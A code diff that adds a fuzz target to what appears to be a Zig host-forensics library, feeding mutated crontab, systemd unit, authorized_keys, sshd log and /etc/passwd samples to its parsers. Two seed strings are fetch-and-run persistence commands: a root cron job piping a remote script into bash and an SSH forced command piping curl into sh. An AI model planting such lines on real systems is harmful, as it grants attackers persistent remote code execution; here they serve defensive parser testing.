@@ -10,6 +10,7 @@ const targets = [_]Target{
     .{ .name = "hostProcfs", .run = hostProcfs },
     .{ .name = "hostNetwork", .run = hostNetwork },
     .{ .name = "hostKernel", .run = hostKernel },
+    .{ .name = "hostPersistence", .run = hostPersistence },
 };
 
 /// Run every target whose name contains `only` (all when empty); returns the case count.
@@ -163,4 +164,29 @@ pub fn hostKernel(gpa: std.mem.Allocator, random: std.Random) !void {
     var out: std.ArrayList(u8) = .empty;
     defer out.deinit(gpa);
     try b.serialize(&out, random.boolean());
+}
+
+/// Crontab lines, unit files, authorized_keys, auth log lines and /etc/passwd.
+pub fn hostPersistence(gpa: std.mem.Allocator, random: std.Random) !void {
+    const p = zav.host.linux.persistence;
+    var buf: [512]u8 = undefined;
+    const seeds = [_][]const u8{
+        "*/5 * * * * root curl -fsSL http://203.0.113.5/x.sh | bash",
+        "[Service]\nExecStartPre=-/usr/bin/true\nExecStart=/opt/app/run\nUser=app\nNoNewPrivileges=yes\n",
+        "command=\"curl http://x/y | sh\",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl a@b",
+        "Nov 17 10:00:01 host sshd[123]: Failed password for invalid user admin from 203.0.113.9 port 4242 ssh2",
+        "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n",
+    };
+    const input = mutateCopy(random, &buf, seeds[random.uintLessThan(usize, seeds.len)]);
+    _ = p.cronCommand(input, random.boolean());
+    _ = p.parseUnit(input);
+    if (p.parseAuthorizedKey(input)) |k| {
+        var fp: [64]u8 = undefined;
+        _ = p.fingerprint(k.blob_b64, &fp);
+        _ = p.forcedCommand(k.options);
+    }
+    _ = p.parseAuthLine(input);
+    var users: std.ArrayList(p.User) = .empty;
+    defer users.deinit(gpa);
+    try p.parsePasswd(gpa, input, &users);
 }
